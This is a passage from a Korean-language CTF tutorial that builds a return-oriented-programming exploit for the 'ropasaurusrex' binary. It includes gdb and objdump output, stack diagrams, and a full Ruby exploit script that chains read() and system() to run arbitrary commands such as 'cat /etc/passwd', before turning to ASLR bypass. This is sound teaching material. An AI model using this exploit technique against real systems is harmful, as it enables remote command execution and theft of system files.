</span></code></pre></td></tr></table></div></figure>


<p>그리고 크래시를 일으키는 걸 확인해라:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
</span><span class='line'>connect to <span class="o">[</span>127.0.0.1<span class="o">]</span> from debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 53456
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>그게 <code>read()</code>의 반환 주소(<code>0x43434343</code>)에서 크래시를 일으켰고 명령어를 메모리 <code>0x08049530</code>에 썼다는 걸 확인해라:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gdb --quiet ./ropasaurusrex core
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x43434343 in ?? ()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/s 0x08049530
</span><span class='line'>0x8049530:       <span class="s2">&quot;cat /etc/passwd&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>완벽하다!</p>

<h3><a id="running-it"></a>실행하기</h3>

<p>이제 우린 <code>cat /etc/passwd</code>를 메모리에 썼고, <code>system()</code>을 호출해서 저 주소를 가리키면 된다. 거의 다 됐다. ASLR이 적용되지 않았다면 쉽다. 실행 파일에는 libc가 링크되어 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>ldd ./ropasaurusrex
</span><span class='line'>        linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7703000<span class="o">)</span>
</span><span class='line'>        libc.so.6 <span class="o">=</span>&gt; /lib/i686/cmov/libc.so.6 <span class="o">(</span>0xb75aa000<span class="o">)</span>
</span><span class='line'>        /lib/ld-linux.so.2 <span class="o">(</span>0xb7704000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>그리고 <code>libc.so.6</code>엔 <code>system()</code> 함수가 포함되어 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -T /lib/i686/cmov/libc.so.6 <span class="p">|</span> grep system
</span><span class='line'>000f5470 g    DF .text  <span class="m">00000042</span>  GLIBC_2.0   svcerr_systemerr
</span><span class='line'><span class="m">00039450</span> g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
</span><span class='line'><span class="m">00039450</span>  w   DF .text  0000007d  GLIBC_2.0   system
</span></code></pre></td></tr></table></div></figure>


<p>디버거를 통해 ropasaurusrex에서 로드된 <code>system()</code> 주소를 알아낼 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>gdb --quiet ./ropasaurusrex core
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x43434343 in ?? ()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x system
</span><span class='line'>0xb7ec2450 &lt;system&gt;:    0x890cec83
</span></code></pre></td></tr></table></div></figure>


<p><code>system()</code>은 인자를 하나만 받으므로, 스택 프레임을 만드는 건 쉬운 편이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          | - 상관 없다, 다른 함수들이 여기 올 것이다.
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 스택 프레임 시작
</span><span class='line'>|      void *arg       | - buffer, 0x08049530
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | - 'system'이 반환되는 주소
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          | - 상관 없다, system() 지역 변수를 위해 사용할 것이다.
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>이제 이걸 <code>read()</code> 프레임 위에 쌓으면 제법 괜찮아 보인다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 스택 프레임 시작
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
</span><span class='line'>|     size_t count     |
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       |
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        |
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of system]  | &lt;-- 스택 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p><code>read()</code>가 반환하는 순간, 스택 포인터의 위치는 위에 나타낸 대로다. <code>read()</code>가 반환하면, 반환 주소를 스택에서 뽑아 그리로 점프한다. 반환하면 스택은 이렇게 보일 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
</span><span class='line'>|     size_t count     |
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       |
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | &lt;-- 스택 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of system]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>어라, 이건 좋지 않다! <code>system()</code>에 진입할 때, 스택 포인터는 우리가 원하는 <code>system()</code> 프레임 바닥이 아닌 <code>read()</code> 프레임의 안쪽을 가리키고 있다. 어떻게 해야 할까?</p>

<p>사실, ROP 익스플로잇을 수행할 때, <code>pop/pop/ret</code>이라는 굉장히 중요한 구조가 있다. 이 경우엔 <code>pop/pop/pop/ret</code>이며 이걸 줄여 &ldquo;pppr&#8221;이라고 하자. 스택을 비우기에 충분한 &#8220;pop&#8221;들 뒤에 return이라는 것만 기억해라.</p>

<p>스택에서 원하지 않는 것들을 지우기 위해 <code>pop/pop/pop/ret</code>을 사용한다. <code>read()</code>는 인자를 3개 받으므로, 우린 스택에서 그 셋을 모두 뽑은 다음 반환해야 한다. 설명을 위해 <code>read()</code>가 <code>pop/pop/pop/ret</code>으로 반환한 직후의 스택을 그려보자면 이렇다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret을 위한 특별한 프레임
</span><span class='line'>| [address of system]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
</span><span class='line'>|     size_t count     |
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       |
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | &lt;-- 스택 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>&ldquo;pop/pop/pop/ret&#8221;이 실행되고, 반환하기 직전엔 다음과 같다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임
</span><span class='line'>| [address of system]  | &lt;-- 스택 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|     size_t count     | &lt;-- read()의 프레임
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       |
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        |
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>반환하고 나면, 정확히 우리가 원하는 것을 얻을 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
</span><span class='line'>|      void *arg       |
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | &lt;-- 스택 포인터
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- pop/pop/pop/ret의 프레임
</span><span class='line'>| [address of system]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
</span><span class='line'>|     size_t count     |
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       |
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        |
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p><code>pop/pop/pop/ret</code>은 <code>objdump</code>를 이용하면 어렵지 않게 찾을 수 있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -d ./ropasaurusrex <span class="p">|</span> egrep <span class="s1">&#39;pop|ret&#39;</span>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'> 80484b5:       5b                      pop    ebx
</span><span class='line'> 80484b6:       5e                      pop    esi
</span><span class='line'> 80484b7:       5f                      pop    edi
</span><span class='line'> 80484b8:       5d                      pop    ebp
</span><span class='line'> 80484b9:       c3                      ret
</span></code></pre></td></tr></table></div></figure>


<p>이건 다음 함수를 실행할 때 1~4개의 인자를 스택에서 지울 수 있게 해준다. 완벽하다!</p>

<p>그리고 이걸 직접 따라해 보고 있다면, pop들이 연속한 주소에 있어야 한다는 걸 기억해라. 그래서 <code>egrep</code>으로 찾는 것은 약간 위험하다.</p>

<p>이제 우리는 세 개의 <code>pop</code>과 <code>ret</code>이 필요하면 (<code>read()</code>가 사용한 세 개의 인자를 지우기 위해) 주소 <code>0x80484b6</code>을 사용하면 될 것이다. 그러면 스택은 이렇게 될 것이다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- system()의 프레임 시작
</span><span class='line'>|      void *arg       | - 0x08049530 (buf)
</span><span class='line'>+----------------------+
</span><span class='line'>|   [return address]   | - 0x44444444
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of system]  | - 0xb7ec2450
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+ &lt;-- read()의 프레임 시작
</span><span class='line'>|     size_t count     | - strlen(cmd)
</span><span class='line'>+----------------------+
</span><span class='line'>|      void *buf       | - 0x08049530 (buf)
</span><span class='line'>+----------------------+
</span><span class='line'>|        int fd        | - 0 (stdin)
</span><span class='line'>+----------------------+
</span><span class='line'>| [address of "pppr"]  | - 0x080484b6
</span><span class='line'>+----------------------+
</span><span class='line'>
</span><span class='line'>+----------------------+
</span><span class='line'>|         ...          |
</span><span class='line'>+----------------------+</span></code></pre></td></tr></table></div></figure>


<p>원격 서버에서 보내는 걸 받기 위해 <code>s.read()</code>를 익스플로잇 마지막에 추가하자. 현재 익스플로잇은 다음과 같다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span> <span class="mi">4444</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># The command we&#39;ll run</span>
</span><span class='line'><span class="n">cmd</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -x</span>
</span><span class='line'><span class="n">buf</span> <span class="o">=</span> <span class="mh">0x08049530</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep read</span>
</span><span class='line'><span class="n">read_addr</span> <span class="o">=</span> <span class="mh">0x0804832C</span>
</span><span class='line'><span class="c1"># From objdump -D ./ropasaurusrex | grep write</span>
</span><span class='line'><span class="n">write_addr</span> <span class="o">=</span> <span class="mh">0x0804830C</span>
</span><span class='line'><span class="c1"># From gdb, &quot;x/x system&quot;</span>
</span><span class='line'><span class="n">system_addr</span> <span class="o">=</span> <span class="mh">0xb7ec2450</span>
</span><span class='line'><span class="c1"># From objdump, &quot;pop/pop/pop/ret&quot;</span>
</span><span class='line'><span class="n">pppr_addr</span> <span class="o">=</span> <span class="mh">0x080484b6</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Generate the payload</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">140</span> <span class="o">+</span>
</span><span class='line'>  <span class="o">[</span>
</span><span class='line'>    <span class="c1"># system()&#39;s stack frame</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
</span><span class='line'>    <span class="mh">0x44444444</span><span class="p">,</span>  <span class="c1"># system()&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># pop/pop/pop/ret&#39;s stack frame</span>
</span><span class='line'>    <span class="n">system_addr</span><span class="p">,</span> <span class="c1"># pop/pop/pop/ret&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1"># read()&#39;s stack frame</span>
</span><span class='line'>    <span class="n">cmd</span><span class="o">.</span><span class="n">length</span><span class="p">,</span>  <span class="c1"># number of bytes</span>
</span><span class='line'>    <span class="n">buf</span><span class="p">,</span>         <span class="c1"># writable memory (cmd buf)</span>
</span><span class='line'>    <span class="mi">0</span><span class="p">,</span>           <span class="c1"># stdin</span>
</span><span class='line'>    <span class="n">pppr_addr</span><span class="p">,</span>   <span class="c1"># read()&#39;s return address</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">read_addr</span> <span class="c1"># Overwrite the original return</span>
</span><span class='line'>  <span class="o">].</span><span class="n">reverse</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;I*&quot;</span><span class="p">)</span> <span class="c1"># Convert a series of &#39;ints&#39; to a string</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Write the &#39;exploit&#39; payload</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># When our payload calls read() the first time, this is read</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Read the response from the command and print it to the screen</span>
</span><span class='line'><span class="nb">puts</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Clean up</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>그리고 실행하게 되면, 예상대로 나온다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
</span><span class='line'>root:x:0:0:root:/root:/bin/bash
</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
</span><span class='line'>...
</span></code></pre></td></tr></table></div></figure>


<p>그리고 <a href="https://en.wikipedia.org/wiki/Core_dump">코어 덤프</a>를 보면, 예상한 대로 <code>0x44444444</code>에서 크래시를 일으킨다.</p>

<p>끝났다, 그렇지?</p>

<p>실은 틀렸다!</p>

<p>이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>sudo sysctl -w kernel.randomize_va_space<span class="o">=</span>1
</span><span class='line'>kernel.randomize_va_space <span class="o">=</span> 1
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;cat /etc/passwd&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>여기서부터 조금 더 복잡해진다. 가보자!</p>

<h2><a id="what-is-aslr"></a>ASLR이 뭐야?</h2>

<p>ASLR&mdash;주소 공간 레이아웃 불규칙화(address space layout randomization)&mdash;은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 <code>system()</code>의 주소를 알아내 보자:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> <span class="p">|</span> ./ropasaurusrex
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x41414141 in ?? ()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x system
</span><span class='line'>0xb766e450 &lt;system&gt;:    0x890cec83
</span><span class='line'>
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> <span class="p">|</span> ./ropasaurusrex
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x41414141 in ?? ()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x system
</span><span class='line'>0xb76a7450 &lt;system&gt;:    0x890cec83
</span></code></pre></td></tr></table></div></figure>


<p><code>system()</code>의 주소가 <code>0xb766e450</code>에서 <code>0xb76a7450</code>으로 바뀐 것을 보라. 이게 문제다!</p>

<h2><a id="defeating-aslr"></a>ASLR 정복</h2>

<p>그래서, 뭘 해야 할까? 사실, 바이너리 자체는 ASLR이 적용되지 않아서, 유용하게도 거기 있는 모든 주소는 그대로 머물러 있다고 믿을 수 있다. 아주 중요하게도, 재배치(relocation) 테이블은 같은 주소에 남아있다:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
